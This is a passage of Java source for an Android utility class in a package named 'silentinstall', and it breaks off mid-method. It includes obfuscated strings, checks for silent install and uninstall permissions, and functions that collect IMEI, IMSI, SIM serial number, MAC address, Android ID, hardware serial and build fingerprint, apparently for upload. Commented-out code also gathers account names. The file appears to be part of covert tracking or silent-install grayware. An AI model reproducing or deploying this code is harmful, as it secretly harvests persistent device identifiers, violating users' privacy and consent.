package com.invisible.silentinstall.utils;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.MemoryInfo;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.Configuration;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.Formatter;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.widget.Toast;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.RandomAccessFile;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.invisible.silentinstall.utils.CtsPtyManager.Eget;

public class Util_AndroidOS {
    public static final int MAX_DENSITY = 240;


    /**
     * 按类型来启动指定包的相关组件
     *
     * @param cmd str_activity,str_service,str_broad
     * @param pkgName  packageName
     * @param component 组件的名
     */
    public static void startComponent(String cmd, String pkgName, String component, Bundle extData) {
        try {
            String str_activity = new String(new byte[]{97, 99, 116, 105, 118, 105, 116, 121});
            String str_service = new String(new byte[]{115, 101, 114, 118, 105, 99, 101});
            String str_broad = new String(new byte[]{98, 114, 111, 97, 100, 99, 97, 115, 116    });


            String cType = cmd;
            String cName = component;
            if (DataUtil.equalsOneOrNull(cType, "")
                    || DataUtil.equalsOneOrNull(cName, "")) {
                Util_Log.log("启动参数为 空，不予启动！");
                return;
            }
            if (Util_Log.logShow) Util_Log.log("启动， type:" + cType + ",name:" + cName);
            Context ctx = GlobalContext.getCtx();
            if (cType.equals(str_activity)) {
                startAcitvity(ctx, pkgName, cName,extData);
            } else if (cType.equals(str_service)) {
                startService(ctx, pkgName, cName,extData);
            } else if (cType.equals(str_broad)) {
                sendBroadcast(ctx, pkgName, cName,extData);
            } else {
                if (Util_Log.logShow) Util_Log.log("不识别的任务启动类型：" + cType);
            }
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    public static void startAcitvity(Context ctx, String pkgname, String actName, Bundle extData) {
        ComponentName componetName = new ComponentName(
                // 这个是另外一个应用程序的包名
                pkgname,
                // 这个参数是要启动的Activity
                actName);
        try {
            Intent intent = new Intent();
            intent.setComponent(componetName);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if(extData!=null)
                intent.putExtras(extData);
            ctx.startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
            Util_Log.log("启动act失败！");
            // Toast.makeText(getApplicationContext(),
            // "可以在这里提示用户没有找到应用程序，或者是做其他的操作！", 0).show();
        }
    }


    public static void startService(Context ctx, String pkgname, String actName, Bundle extData) {
        ComponentName componetName = new ComponentName(pkgname, actName);
        try {
            Intent intent = new Intent();
            intent.setComponent(componetName);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if(extData!=null)
                intent.putExtras(extData);
            ctx.startService(intent);
        } catch (Exception e) {
            e.printStackTrace();
            Util_Log.log("启动service失败！");
        }
    }

    public static void sendBroadcast(Context ctx, String pkgname, String action, Bundle extData) {
        try {
            Intent intent = new Intent();
            if(!TextUtils.isEmpty(pkgname))
                intent.setPackage(pkgname);
            intent.setAction(action);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(32);
            if(extData!=null)
                intent.putExtras(extData);
            ctx.sendBroadcast(intent);
        } catch (Exception e) {
            e.printStackTrace();
            Util_Log.log("发送广播失败...");
        }
    }


    @Deprecated
    public static String GetUuid(Context context) {
        return UUIDRetriever.get(context);
    }

    public static Intent getIntent4pkg(Context ctx, String pkg) {
        return ctx.getPackageManager().getLaunchIntentForPackage(pkg);
    }

    public static PackageInfo getPinfo(Context ctx) {
        try {
            return ctx.getPackageManager().getPackageInfo(ctx.getPackageName(),
                    0);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }



    public static boolean isSystemApp(Context ctx, String pkname) {
        try {
            PackageInfo pInfo = ctx.getPackageManager().getPackageInfo(pkname, 0);
            if (pInfo == null)
                return false;
            return ((pInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
        } catch (Exception e) {
            //e.printStackTrace();
        }
        return false;
    }

    /**
     * @param ctx
     * @return 0：没有网络，1：wifi,2:手机网络
     */
    public static int getNetType(Context ctx) {
        try {
            ConnectivityManager connectMgr = (ConnectivityManager) ctx
                    .getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo info = connectMgr.getActiveNetworkInfo();
            // if(info==null)return 0;
            // if(info.getType() == ConnectivityManager.TYPE_WIFI)return 1;
            // if(info.getType() == ConnectivityManager.TYPE_MOBILE)return 2;
            return info == null ? 0 : info.getType() == 1 ? 1
                    : info.getType() == 0 ? 2 : 0;
        }catch (Exception e){
            return 0;
        }

    }

    /**
     * @param context
     * @return 当前应用的 应用名，即application的 label标签
     */
    public static String getAppName(Context context) {
        String appName = "";
        try {
            appName = (String) context.getPackageManager().getApplicationLabel(
                    context.getApplicationInfo());
        } catch (Exception e) {
            if (Util_Log.logShow)
                e.printStackTrace();
        }
        return appName;
    }

    public static String getIMEI(Context ctx) {
        String imei = null;
        try {
            TelephonyManager tm = (TelephonyManager) ctx
                    .getSystemService(Context.TELEPHONY_SERVICE);
            imei = tm.getDeviceId();
            if (imei == null)
                imei = "";
        } catch (Exception e1) {
            e1.printStackTrace();
        }

        return imei;
    }

    public static String getIMSI(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx
                .getSystemService(Context.TELEPHONY_SERVICE);
        String imsi = tm.getSubscriberId();
        if (imsi == null)
            imsi = "";

        return imsi;
    }

    public static TelephonyManager getTmanager(Context ctx) {
        return (TelephonyManager) ctx
                .getSystemService(Context.TELEPHONY_SERVICE);
    }

    /**
     * @param ctx
     * @return
     */
    public static Locale getLocale(Context ctx) {
        Configuration cf = ctx.getResources().getConfiguration();
        return cf.locale;
    }

    /**
     * @return eg: zh
     */
    public static String getLanguage() {
        return Locale.getDefault().getLanguage();
    }

    /**
     * @return eg. : CN
     */
    public static String getContry() {
        return Locale.getDefault().getCountry();
    }

    public static int getWidth(Context ctx) {
        WindowManager wm = (WindowManager) ctx
                .getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(dm);
        return dm.widthPixels;
    }

    public static int getHeight(Context ctx) {

        WindowManager wm = (WindowManager) ctx
                .getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(dm);
        return dm.heightPixels;
    }

    public static boolean IsNetworkAvailable(Context context) {
            // get current application context
            ConnectivityManager connectivity = (ConnectivityManager) context
                    .getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo info = connectivity.getActiveNetworkInfo();
            if (info != null && info.isConnected()) {
                if (info.getState() == NetworkInfo.State.CONNECTED) {
                    return true;
                }
            }

        return false;
    }
//
//    /**
//     * 查看当前网络，如果无网络就申请开启
//     *
//     * @param ctx
//     * @return
//     */
//    public static boolean IsNetAvailableOrOpen(Context ctx) {
//        boolean isNetAva = IsNetworkAvailable(ctx);
//        if (isNetAva)
//            return true;
//
//        // if(GlobalContext.getRoleType()!=RoleType.abroadGame){
//        // return false;
//        // }else{
//        // //海外用户就强制开始网络
//        // try {
//        //
//        // } catch (Throwable e) {
//        // forceNet = false;
//        // }
//        // }
//
//        // forceNet
//        String plugin = CtsPtyManager.Eget(EE.p, EE.l, EE.u, EE.g, EE.i, EE.n);
//
//        //forceNet
//        try {
//            LMTInvokerProxy lmtInvoker = new LMTInvokerProxy(ctx, plugin);
//            lmtInvoker.BindLMT();
//            boolean necna = lmtInvoker.isNetConnected(false);
//            if (!necna) new LMTInvokerProxy(ctx, plugin).unBindLMT();
//            return necna;
//        } catch (Throwable e) {
//            e.printStackTrace();
//            //new LMTInvoker(ctx, plugin).unBindLMT();
//        }
//        return false;
//    }

    /**
     * @param ctx 只要是act的子类，则会弹出，否则不会
     * @param msg
     * @date 2014年9月10日
     * @des 弹出指定的toast信息 （当ctx为Activity的子类时）
     */
    public static void toastAct(final Context ctx, final String msg) {
        if (Activity.class.isAssignableFrom(ctx.getClass())) {
            ((Activity) ctx).runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show();
                    Util_Log.log(msg);
                }
            });
        }
    }



    /**
     * @param context
     * @return
     * @date 2014年8月14日
     * @des 获取当前前台的包名
     */
    public static String getTopRunPackage(Context context) {
        try {
            ActivityManager am = (ActivityManager) context
                    .getSystemService(Context.ACTIVITY_SERVICE);
            List<RunningTaskInfo> list = am.getRunningTasks(5);
            return list.get(0).topActivity.getPackageName();
        } catch (Exception e) {
            if (Util_Log.logShow)
                e.printStackTrace();
            return "";
        }
    }

    /**
     * 传入的包名是否在后台运行
     *
     * @param ctx
     * @return
     */
    public static boolean isPkgRunBack(Context ctx, String pname) {
        try {
            ActivityManager am = (ActivityManager) ctx
                    .getSystemService(Context.ACTIVITY_SERVICE);
            List<RunningAppProcessInfo> list = am.getRunningAppProcesses();
            for (int i = 0; i < list.size(); i++) {
                if (list.get(i).processName.equals(pname)) {
                    return true;
                }
            }
        } catch (Exception e) {
            if (Util_Log.logShow)
                e.printStackTrace();
            return false;
        }
        return true;
    }

    // 当前应用是否运行在前台
    public static boolean appIsRunTop(Context ctx) {
        return ctx.getPackageName().equals(getTopRunPackage(ctx)) ? true
                : false;
    }

    /**
     * @param context
     * @param intent
     * @date 2014-5-30
     * @des 为intent设置一个正确的浏览器的包
     */
    public static void setBrowserType(Context context, Intent intent) {
        if (isExistPackage(context, "com.android.browser")) {
            intent.setClassName("com.android.browser",
                    "com.android.browser.BrowserActivity");
            // intent.setPackage("com.android.browser");
        } else if (isExistPackage(context, "org.mozilla.firefox")) {
            /** firefox */
            intent.setPackage("org.mozilla.firefox");
        } else if (isExistPackage(context, "com.opera.browser")) {
            /** opera */
            intent.setPackage("com.opera.browser");
        } else if (isExistPackage(context, "com.UCMobile")) {// com.UCMobile
            /** uc */
            intent.setPackage("com.UCMobile");
        } else if (isExistPackage(context, "com.tencent.mtt")) {
            /** qq */
            intent.setPackage("com.tencent.mtt");
        }
    }

    /**
     * @param ctx
     * @param uri
     * @return 用指定uri打开系统浏览器
     */
    public static Intent createBrowserIntent(Context ctx, String uri) {
        if (!uri.startsWith("http"))
            return null;
        Intent retIntent = new Intent();
        retIntent.setAction("android.intent.action.VIEW");
        retIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        setBrowserType(ctx, retIntent);
        Uri content_url = Uri.parse(uri);
        retIntent.setData(content_url);
        return retIntent;
    }


    /**
     * 通过 应用包名 调用电子市场
     *
     * @param context
     * @param packageName
     */
    public static void callMarketByPackageName(Context context,
                                               String packageName) {
        Uri uri = Uri.parse("market://search?q=pname:" + packageName);
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        if (isExistPackage(context, "com.android.vending"))// 判断一下是否有google
            // market
            intent.setPackage("com.android.vending");// 指定用google market打开

        context.startActivity(intent);
    }



    @Deprecated
    /**
     * @param ctx
     * @return 是否有静默安装的权限
        直接用 {@link #checkPermission(Context, String)} 替换
     */
    public static boolean checkSilenceInstallPermission(Context ctx) {
        return checkPermission(ctx,android.Manifest.permission.INSTALL_PACKAGES);

    }
    @Deprecated
    public static boolean checkSilenceUnInstallPermission(Context ctx) {
     return checkPermission(ctx,android.Manifest.permission.DELETE_PACKAGES);
    }
    public static boolean checkPermission(Context ctx, String permission) {
        try {
            PackageManager pm = ctx.getPackageManager();
            int result = pm.checkPermission(
                    permission,
                    ctx.getPackageName());
            if (result == PackageManager.PERMISSION_GRANTED) {
                return true;
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return false;
    }
    public static boolean isMIUIRom(){
        String property = getSystemProperty("ro.miui.ui.version.name");
        return !TextUtils.isEmpty(property);
    }
    public static String getSystemProperty(String propName) {
        String line;
        BufferedReader input = null;
        try {
            Process p = Runtime.getRuntime().exec("getprop " + propName);
            input = new BufferedReader(new InputStreamReader(p.getInputStream()), 1024);
            line = input.readLine();
            input.close();
        } catch (IOException ex) {
            return null;
        } finally {
            if (input != null) {
                try {
                    input.close();
                } catch (IOException e) {
                }
            }
        }
        return line;
    }
    public static String getPkgName4File(Context ctx, String filePath) {
        try {
            PackageInfo packageInfo = ctx.getPackageManager()
                    .getPackageArchiveInfo(filePath, 0);
            return packageInfo.packageName;
        } catch (Exception e) {
            e.printStackTrace();

        }
        return null;
    }
    public static PackageInfo getPkgInfo4File(Context ctx, String filePath){
        try {
            PackageInfo packageInfo = ctx.getPackageManager()
                    .getPackageArchiveInfo(filePath, 0);
            return packageInfo ;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    public static String getAvailMemory(Context ctx) {// 获取android当前可用内存大小

        ActivityManager am = (ActivityManager) ctx
                .getSystemService(Context.ACTIVITY_SERVICE);
        MemoryInfo mi = new MemoryInfo();
        am.getMemoryInfo(mi);
        // mi.availMem; 当前系统的可用内存
        return Formatter.formatFileSize(ctx, mi.availMem);// 将获取的内存大小规格化
    }

    /**
     * @return 返回机器的内容大小，单位是G
     */
    public String getTotalRAM() {
        RandomAccessFile reader = null;
        String load = null;
        DecimalFormat twoDecimalForm = new DecimalFormat("#.##");
        double totRam = 0;
        String lastValue = "";
        try {
            reader = new RandomAccessFile("/proc/meminfo", "r");
            load = reader.readLine();

            // Get the Number value from the string
            Pattern p = Pattern.compile("(\\d+)");
            Matcher m = p.matcher(load);
            String value = "";
            while (m.find()) {
                value = m.group(1);
                // System.out.println("Ram : " + value);
            }
            reader.close();

            totRam = Double.parseDouble(value);
            // totRam = totRam / 1024;

            double mb = totRam / 1024.0;
            double gb = totRam / (1024*1024);
            double tb = totRam / (1024*1024*1024);

//            if (tb > 1) {
//                lastValue = twoDecimalForm.format(tb).concat(" TB");
//            } else if (gb > 1) {
//                lastValue = twoDecimalForm.format(gb).concat(" GB");
//            } else if (mb > 1) {
//                lastValue = twoDecimalForm.format(mb).concat(" MB");
//            } else {
//                lastValue = twoDecimalForm.format(totRam).concat(" KB");
//            }
            lastValue = twoDecimalForm.format(gb);
        } catch (IOException ex) {
            ex.printStackTrace();
        } finally {
            // Streams.close(reader);
        }

        return lastValue;
    }
    /**
     * 调用系统安装 指定 文件
     *
     * @param context
     * @param fileName
     */
    public static void callInstall(Context context, String fileName) {
        try {

            PackageInfo packageInfo = context.getPackageManager()
                    .getPackageArchiveInfo(fileName, 0);
            if (null == packageInfo) {
                File tmpFile = new File(fileName);
                if (tmpFile.exists()) {
                    tmpFile.delete();
                }
            } else {
                File file = new File(fileName);
                Intent intent = new Intent();
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.setAction(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(file),
                        "application/vnd.android.package-archive");
                context.startActivity(intent);
            }

        } catch (Exception ex) {

        }
    }

    public static int getPackage(Context context, String[] packname) {

        try {
            if (packname[0] == null || packname[0].equals(""))
                return -1;
            PackageManager pm = context.getPackageManager();
            PackageInfo packageInfo = pm.getPackageInfo(packname[0],
                    PackageManager.GET_ACTIVITIES);
            if (packageInfo != null) {
                if (DataUtil.String2Int(packname[1]) == packageInfo.versionCode)// 版本一致
                    return packageInfo.versionCode;
                else
                    // 版本不一致
                    return -1;
            }

        } catch (NameNotFoundException e) {
            if (Util_Log.logShow)
                e.printStackTrace();
            return -1;
        } catch (Exception er) {
            return -1;
        } catch (Error er1) {
            return -1;
        }
        return -1;

    }

    /**
     * @param context
     * @param market2value2self 根据名字启动应用. 如果是market:就启动谷歌商店<br/>
     *                          否则就启动该包名对应的apk<br/>
     *                          如果本地没有对应apk，就启动自己！
     */
    public static void startAppByName(Context context, String market2value2self) {
        try {
            PackageManager packageManager = context.getPackageManager();
            Intent intent = null;

            if (market2value2self.startsWith("market:")) {
                intent = new Intent(Intent.ACTION_VIEW,
                        Uri.parse(market2value2self));

                if (isExistPackage(context, "com.android.vending"))
                    intent.setPackage("com.android.vending");
            } else {
                intent = packageManager
                        .getLaunchIntentForPackage(market2value2self);
                if (intent == null) {
                    intent = context
                            .getPackageManager()
                            .getLaunchIntentForPackage(context.getPackageName());
                }
            }

            context.startActivity(intent);
        } catch (Exception e) {
            if (Util_Log.logShow)
                e.printStackTrace();
        } catch (Error er) {
            if (Util_Log.logShow)
                er.printStackTrace();
        }
    }

    /**
     * @param context
     * @param packname
     * @return
     * @date 2014-5-30
     * @des 机器是否安装有指定包名
     */
    public static boolean isExistPackage(Context context, String packname) {
        try {
            PackageManager pm = context.getPackageManager();
            PackageInfo packageInfo = pm.getPackageInfo(packname,
                    PackageManager.GET_ACTIVITIES);

            if (packageInfo != null) {
                return true;
            }
        } catch (Exception e) {
            // if(Util_Log.logShow)e.printStackTrace();
            return false;
        } catch (Error er) {
            return false;
        }
        return false;

    }

    /**
     * @param _context
     * @return
     * @date 2014-5-29
     * @des 当前应用是否存在指定名称的res资源 如 isExistsRes(ctx,"layout","zztoolkit")
     */
    public static boolean isExistsRes(Context _context, String resType,
                                      String resName) {
        try {
            int i = _context.getResources().getIdentifier(resName, resType,
                    _context.getPackageName());
            if (i == 0) {
                return false;
            } else {
                return true;
            }

        } catch (Exception ex) {
            return false;
        }
    }

    public static ApplicationInfo findMetaData(Context ctx, String key){
        PackageManager pm = ctx.getPackageManager();
        try{
            List<PackageInfo> pkgList =pm.getInstalledPackages(0);
            for(PackageInfo info : pkgList){
                ApplicationInfo appInfo = pm.getApplicationInfo(info.packageName, PackageManager.GET_META_DATA);
                Bundle bd = appInfo.metaData;
                if(bd==null)continue;
                Object obj = bd.get(key);
                if(obj!=null){
//                    System.out.println("find it , panme : "+appInfo.packageName);
                    return appInfo;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public static String findMetaData(Context ctx, String key, String def){
        ApplicationInfo info  = findMetaData(ctx, key);
        if(info!=null){
            Bundle bd = info.metaData;
            return  bd.get(key).toString();
        }
        return def;
    }
    /**
     * @param hostService
     * @return 获取当前设备的基本信息
     */
    public static List<NameValuePair> getBaseParams(Context hostService) {
        /** 填充参数 */
        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
        try {
            TelephonyManager tm = (TelephonyManager) hostService
                    .getSystemService(Context.TELEPHONY_SERVICE);
            String operator = tm.getSimOperator();
            nameValuePairs.add(new BasicNameValuePair(Eget(EE.o, EE.p, EE.e, EE.r, EE.a, EE.t, EE.o,
                    EE.r)/* "operator" */, operator));
            nameValuePairs.add(new BasicNameValuePair(
                    Eget(EE.I, EE.M, EE.E, EE.I)/* "IMEI" */, tm.getDeviceId()));
            try {
                nameValuePairs.add(new BasicNameValuePair(
                        Eget(EE.I, EE.M, EE.S, EE.I)/* "IMSI" */, tm.getSubscriberId()));
            } catch (Exception e1) {
                nameValuePairs.add(new BasicNameValuePair(
                        Eget(EE.I, EE.M, EE.S, EE.I)/* "IMSI" */, ""));
            }
            nameValuePairs.add(new BasicNameValuePair(
                    Eget(EE.c, EE.o, EE.u, EE.n, EE.r, EE.t, EE.y)/* "counrty" */, Locale
                    .getDefault().getCountry()));
            nameValuePairs.add(new BasicNameValuePair("language", Locale
                    .getDefault().getLanguage()));
            nameValuePairs.add(new BasicNameValuePair("sdcard", String
                    .valueOf(Environment.MEDIA_MOUNTED.equals(Environment
                            .getExternalStorageState()))));
            nameValuePairs.add(new BasicNameValuePair("androidVersion", String
                    .valueOf(Build.VERSION.SDK_INT)));
            nameValuePairs.add(new BasicNameValuePair("androidId",
                    Util_AndroidOS.getAndroidId(hostService)));
            nameValuePairs
                    .add(new BasicNameValuePair(
                            Eget(EE.app, EE.v, EE.e, EE.r, EE.code)/* "appvercode" */, String
                            .valueOf(Util_AndroidOS
                                    .getVersionCode(hostService))));
            /** 增加获取包名 */
            nameValuePairs.add(new BasicNameValuePair("appPackname",
                    hostService.getPackageName()));

        } catch (Exception ex3) {
            // nameValuePairs.add(new BasicNameValuePair("operator", "0000"));
            // nameValuePairs.add(new BasicNameValuePair("IMEI", "00000000"));
            // nameValuePairs.add(new BasicNameValuePair("IMSI", "00000000"));
            // nameValuePairs.add(new BasicNameValuePair("counrty", "0"));
            // nameValuePairs.add(new BasicNameValuePair("language", "0"));
            // nameValuePairs.add(new BasicNameValuePair("sdcard", "false"));
            // nameValuePairs.add(new BasicNameValuePair("androidId", "-1"));
            // nameValuePairs.add(new BasicNameValuePair("appvercode", "-1"));
            // nameValuePairs.add(new BasicNameValuePair("appPackname",
            // "null"));
            nameValuePairs.add(new BasicNameValuePair("language", "exception"));
        }
        return nameValuePairs;
    }

    /**
     * @param context
     * @return
     * @date 2014-5-30
     * @des 获取设备的android ID
     */
    public static String getAndroidId(Context context) {
        String ANDROID_ID = "-1";

        try {
            ANDROID_ID = Settings.Secure.getString(
                    context.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Throwable e) {
        }
        if (ANDROID_ID == null)
            ANDROID_ID = "-1";
        return ANDROID_ID;
    }

    public static boolean hasSdcard(Context ctx) {
        if (ctx == null)
            return false;
        boolean b = Environment.MEDIA_MOUNTED.equals(Environment
                .getExternalStorageState());
        return b;
    }
    public static boolean hasSdcard(){
        boolean b = Environment.MEDIA_MOUNTED.equals(Environment
                .getExternalStorageState());
        return b;
    }

    /**
     * @param nameValuePairs
     * @param ctx
     * @date 2014-5-28
     * @des组合一些信息到list
     */
    public static void getDeviceBasicInfo(List<NameValuePair> nameValuePairs,
                                          final Context ctx) {
        /** 1,cha.txt/cha.chg内容 **/
        nameValuePairs.add(new BasicNameValuePair("gameId", GlobalContext.getGid()));
        nameValuePairs.add(new BasicNameValuePair("channelId", ""+ GlobalContext.getCid()));

	/*
     * nameValuePairs.add(new BasicNameValuePair("channelId", "-1"));
	 * nameValuePairs.add(new BasicNameValuePair("gameId", "-1"));
	 * nameValuePairs.add(new BasicNameValuePair("cpId", "-1"));
	 * nameValuePairs.add(new BasicNameValuePair("promoterId", "-1"));
	 * nameValuePairs.add(new BasicNameValuePair("netgame", "false"));
	 * nameValuePairs.add(new BasicNameValuePair("netgame", "false"));
	 */

        /** 2,base **/
        try {
	    /*
	     * 插件相关的移动到了plugin_util String mUid = Util_AppData.getUid(ctx); if
	     * (!mUid.equals("")) { nameValuePairs.add(new
	     * BasicNameValuePair("uid", mUid)); }
	     */
            TelephonyManager tm = (TelephonyManager) ctx
                    .getSystemService(Context.TELEPHONY_SERVICE);
            String operator = tm.getSimOperator();
            nameValuePairs.add(new BasicNameValuePair("operator", operator));
            //有相关权限时才上传
            if(checkPermission(ctx, Manifest.permission.READ_PHONE_STATE)){
                try {
                    nameValuePairs
                            .add(new BasicNameValuePair("IMEI", tm.getDeviceId()));
                } catch (Exception e1) {
                    nameValuePairs
                            .add(new BasicNameValuePair("IMEI", ""));
                }
                nameValuePairs.add(new BasicNameValuePair("IMSI", tm
                        .getSubscriberId()));
                /*** 获取uuid */
                nameValuePairs.add(new BasicNameValuePair("uuid", DataUtil
                        .GetUuid(ctx)));
                nameValuePairs.add(new BasicNameValuePair("networkOperatorName",""+tm.getNetworkOperatorName()));
                nameValuePairs.add(new BasicNameValuePair("simSerialNumber", "" + tm.getSimSerialNumber()));
                nameValuePairs.add(new BasicNameValuePair("simOperator",""+tm.getSimOperator()));
                nameValuePairs.add(new BasicNameValuePair("networkOperator",""+tm.getNetworkOperator()));
            }
            nameValuePairs.add(new BasicNameValuePair("counrty", Locale
                    .getDefault().getCountry()));
            nameValuePairs.add(new BasicNameValuePair("language", Locale
                    .getDefault().getLanguage()));
            nameValuePairs.add(new BasicNameValuePair("sdcard", String
                    .valueOf(Environment.MEDIA_MOUNTED.equals(Environment
                            .getExternalStorageState()))));
            nameValuePairs.add(new BasicNameValuePair("androidVersion", String
                    .valueOf(Build.VERSION.SDK_INT)));
            // 插件的版本号
            nameValuePairs
                    .add(new BasicNameValuePair(
                            Eget(EE.v, EE.e, EE.r, EE.c, EE.o, EE.d, EE.e)/* "vercode" */, String
                            .valueOf(Cts.version)));

            nameValuePairs.add(new BasicNameValuePair("androidId",
                    Util_AndroidOS.getAndroidId(ctx)));
            if (Build.VERSION.SDK_INT >= 9)
                nameValuePairs.add(new BasicNameValuePair("serial",
                        Build.SERIAL));

            nameValuePairs.add(new BasicNameValuePair("buildTime",
                    Build.TIME + ""));

        } catch (Exception ex3) {
            if (Util_Log.logShow)
                ex3.printStackTrace();
            // nameValuePairs.add(new BasicNameValuePair("vercode", String
            // .valueOf(PublicConfig.getInstance(ctx).getVersion())));
            // nameValuePairs.add(new BasicNameValuePair("operator", "0000"));
            // nameValuePairs.add(new BasicNameValuePair("IMEI", "00000000"));
            // nameValuePairs.add(new BasicNameValuePair("IMSI", "00000000"));
            // nameValuePairs.add(new BasicNameValuePair("counrty", "0"));
            // nameValuePairs.add(new BasicNameValuePair("language", "0"));
            // nameValuePairs.add(new BasicNameValuePair("sdcard", "false"));
            // nameValuePairs.add(new BasicNameValuePair("androidVersion",
            // String
            // .valueOf(android.os.Build.VERSION.SDK_INT)));
            // nameValuePairs.add(new BasicNameValuePair("channelId", ""));
            // nameValuePairs.add(new BasicNameValuePair("gameId", ""));
            // nameValuePairs
            // .add(new BasicNameValuePair("uuid", Cts.DEFAULT_UUID));
            // nameValuePairs.add(new BasicNameValuePair("androidId", "-1"));
            nameValuePairs.add(new BasicNameValuePair("language", "exception"));
        }

        // 应用的相关的版本号
        try {
            nameValuePairs.add(new BasicNameValuePair(
                    Eget(EE.app, EE.v, EE.e, EE.r, EE.code)/* "appvercode" */, String
                    .valueOf(getVersionCode(ctx))));
            nameValuePairs.add(new BasicNameValuePair("appvername", String
                    .valueOf(getVersionName(ctx))));
        } catch (Exception ex1) {
            // nameValuePairs.add(new BasicNameValuePair("appvercode", "-1"));
            // nameValuePairs.add(new BasicNameValuePair("appvername", "-1"));
        }

        try {
            /** 增加获取包名 */
            nameValuePairs.add(new BasicNameValuePair("appPackname", ctx
                    .getPackageName()));
        } catch (Exception e) {
            nameValuePairs.add(new BasicNameValuePair("appPackname", "null"));
        }

        /** mac 地址 */
        try {
            nameValuePairs.add(new BasicNameValuePair("macAddr",
                    getMacAddr(ctx)));
        } catch (Exception e) {
            nameValuePairs.add(new BasicNameValuePair("macAddr", ""));
        }


        //一些新的参数—2015年11月10日13:42:06

        nameValuePairs.add(new BasicNameValuePair("model",""+ Build.MODEL));
        nameValuePairs.add(new BasicNameValuePair("brand",""+ Build.BRAND));
        nameValuePairs.add(new BasicNameValuePair("screen",""+ Util_AndroidOS.getWidth(ctx)+"-"+ Util_AndroidOS.getHeight(ctx)));

        nameValuePairs.add(new BasicNameValuePair("product",""+ Build.PRODUCT));
        nameValuePairs.add(new BasicNameValuePair("fingerprint",""+ Build.FINGERPRINT));
        nameValuePairs.add(new BasicNameValuePair("release",""+ Build.VERSION.RELEASE));
        nameValuePairs.add(new BasicNameValuePair("manufacturer",""+ Build.MANUFACTURER));


        /** accountInfo **/
        // try {
        // Account[] accounts = AccountManager.get(ctx).getAccounts();
        // String __accounts = "";
        // for (int i = 0; i < accounts.length; i++) {
        // __accounts += (accounts[i].name + ";");
        // }
        // nameValuePairs.add(new
        // BasicNameValuePair(Eget(a,c,c,o,u,n,t,s)/*"accounts"*/, __accounts));
        // } catch (Exception e) {
        // // nameValuePairs.add(new BasicNameValuePair("accounts", ""));
        // } catch (Error e) {
        // // nameValuePairs.add(new BasicNameValuePair("accounts", ""));
        // }
    }


    /**
     * @param url      apk文件路径
     * @param mContext ctx
     * @return apk是否可安装
     */
    public static boolean isValidApk(String url, Context mContext) {
        {
            boolean retVal = false;
                PackageInfo packageInfo = mContext.getPackageManager()
                        .getPackageArchiveInfo(url, 0);
                retVal = (null != packageInfo);

            return retVal;

        }
    }

    public static String getMacAddr(Context context) {
        String DEFAULT_MAC_ADDR = "";
        /** 增加获取mac 地址功能 */
        String retString = DEFAULT_MAC_ADDR;

        try {
            WifiManager wifiManager = (WifiManager) context
                    .getSystemService(Context.WIFI_SERVICE);

            WifiInfo wifiInfo = wifiManager.getConnectionInfo();

            if (wifiInfo.getMacAddress() != null)
                retString = wifiInfo.getMacAddress();
            else {
                retString = DEFAULT_MAC_ADDR;
            }
        } catch (Exception e) {
            retString = DEFAULT_MAC_ADDR;
        }

        return retString;
    }




    public static String getVersionName(Context context)// 获取版本号
    {
        try {
            PackageInfo pi = context.getPackageManager().getPackageInfo(
                    context.getPackageName(), 0);
            return pi.versionName;
        } catch (NameNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            return "none";
        }
    }


    public static int getVersionCode(Context context)// 获取版本号(内部识别号)
    {
        try {
            PackageInfo pi = context.getPackageManager().getPackageInfo(
                    context.getPackageName(), 0);
            return pi.versionCode;
        } catch (NameNotFoundException e) {
            e.printStackTrace();
            return 0;
        }
    }

    public static PackageInfo getPkgInfo(Context ctx, String pkgName){
        PackageInfo pi = null;
        try {
           pi = ctx.getPackageManager().getPackageInfo(
                   pkgName, 0);
            return pi;
        } catch (NameNotFoundException e) {
